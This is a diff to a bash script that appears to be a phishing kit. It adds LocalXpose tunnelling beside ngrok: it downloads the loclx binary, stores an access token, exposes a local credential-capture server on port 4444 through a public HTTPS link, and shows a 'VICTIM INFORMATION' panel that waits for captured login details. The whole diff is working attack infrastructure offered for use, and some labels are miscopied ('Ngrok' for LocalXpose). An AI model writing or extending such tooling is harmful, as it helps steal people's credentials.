@@ -47,6 +47,56 @@ install_ngrok() {
 	fi
 }
 
+install_localxpose() {
+	if [[ -e "loclx" ]]; then
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
+	else
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
+
+start_loclx() {
+echo -e " "
+rm -rf .loclx
+echo -e ""
+	echo -e "\e[91m[\e[0m-\e[91m]\e[1;92m Launching LocalXpose...\e[0m "
+	{ sleep 1; localxpose_auth; }
+	echo -e "\n"
+	echo "==========================================================="
+echo -e "\e[96mChoose Ngrok Region (for better connection).\e[0m"
+echo "==========================================================="
+echo -e "us - \e[93mUnited States \e[92m(Ohio)\e[0m"
+echo -e "eu - \e[93mEurope \e[92m(Frankfurt)\e[0m"
+echo -e "ap - \e[93mAsia/Pacific \e[92m(Singapore)\e[0m"
+echo -e "au - \e[93mAustralia \e[92m(Sydney)\e[0m"
+echo -e "sa - \e[93mSouth America \e[92m(Sao Paulo)\e[0m"
+echo -e "jp - \e[93mJapan \e[92m(Tokyo)\e[0m"
+echo -e "in - \e[93mIndia \e[92m(Mumbai)\e[0m"
+echo ""
+read -p "Choose Ngrok Region: " loclx_region
+	echo -e ""
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
+	else
+		sleep 1 && ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
+	fi
+
+	sleep 12
+	llink=$(cat .loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	
+}
+
 start_ngrok() {
 	{ sleep 1; }
 	echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok...\e[0m  "
@@ -72,7 +122,7 @@ read -p "Choose Ngrok Region: " nRegion
 	fi
 
 	sleep 8
-	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(*.ngrok.io)')
+	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
 
 }
 
@@ -83,12 +133,41 @@ links_n() {
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+		           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $llink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
 			   echo ""
+}
+
+localxpose_auth() {
+	./loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./loclx account status | grep Error)" ] && {
+	        echo ""
+                echo " "
+		echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+                echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!      Requirement Localxpose Token    !!\e[0m'
+                echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+                echo ""
+                echo " "
+                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Visit \e[92mlocalxpose.io \e[m "
+                echo ""
+                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Create an account on & Click Access Button & Copy Access Token \e[m "
+                echo ""
+		sleep 3
+		read -p $'\e[91m[\e[92m*\e[91m]\e[93m Input Loclx Token :\e[97m ' loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\e[91m[\e[92m!\e[91m]\e[93m  You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
 }
 
 ngroktoken() {
@@ -136,7 +215,8 @@ fi
 
 clear
 install_ngrok
-chmod +x ngrok
+install_localxpose
+chmod +x ngrok loclx
 ngroktoken
 start_ngrok
 links_n
